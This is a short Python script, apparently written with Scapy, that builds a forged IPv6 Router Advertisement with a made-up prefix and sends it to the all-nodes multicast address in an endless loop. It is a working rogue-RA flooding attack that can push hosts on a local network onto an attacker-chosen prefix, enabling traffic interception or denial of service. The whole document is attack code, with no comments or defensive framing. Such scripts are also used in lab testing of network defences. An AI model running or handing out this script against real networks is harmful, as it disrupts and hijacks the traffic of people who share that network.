from scapy.all import *


a=IPv6(src="fe80::a:b:c:d",dst="ff02::1")
b=ICMPv6ND_RA(M=0,O=0)
c=ICMPv6NDOptPrefixInfo(prefixlen=64, prefix="2001:db8:bad:cafe::",L=1,A=1)
pkt = a/b/c

while True:
	send(pkt) 